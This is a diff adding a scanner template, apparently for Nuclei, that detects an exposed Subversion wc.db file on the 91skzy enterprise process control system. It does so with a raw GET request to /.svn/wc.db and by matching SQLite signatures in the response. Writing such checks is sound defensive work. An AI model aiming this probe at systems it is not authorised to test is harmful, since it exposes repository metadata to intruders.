@@ -1,0 +1,31 @@
+id: 91skzy-wc-db-info-disclosure
+
+info:
+  name: 91skzy Enterprise Process Control System wc.db Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Spatiotemporal Wisdom enterprise process control system wc.db information leakage vulnerability allows attackers to retrieve sensitive system information.
+  tags: information-disclosure
+
+http:
+  - raw:
+      - |
+        GET /.svn/wc.db HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: M
+        Content-Length: 102
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "SQLite format"
+          - "dexsqlite_autoindex_ACTUAL_NODE_1ACTUAL_NOD"
